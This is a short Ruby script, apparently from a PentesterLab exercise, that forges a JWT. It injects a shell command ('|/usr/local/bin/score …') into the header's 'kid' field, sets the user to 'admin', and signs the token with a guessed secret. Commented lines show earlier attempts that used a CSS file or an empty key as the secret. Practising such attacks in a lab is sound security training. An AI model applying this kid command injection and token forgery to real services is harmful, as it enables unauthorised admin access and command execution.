require 'base64'
require 'openssl'
require 'json'

# orig header = {"typ":"JWT","alg":"HS256","kid":"0001"}
header = {"typ"=>"JWT","alg"=>"HS256","kid"=>"|/usr/local/bin/score b691b7cf-e394-46cf-ba87-7f986fc25c08"}.to_json

# orig payload = '{"user":null}'
payload = {"user"=>"admin"}.to_json


data = Base64.strict_encode64(header).gsub("=","")+"."+Base64.strict_encode64(payload).gsub("=","")
# data.gsub!("=","")

# for public/css header
# secret = File.open("../../../Documents/PenTesterLab/bootstrap.css").read
secret = "1234"
# for Dev/nul header
# secret = ""

# sig = 'spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y'
signature = Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"), secret, data))

puts data+"."+signature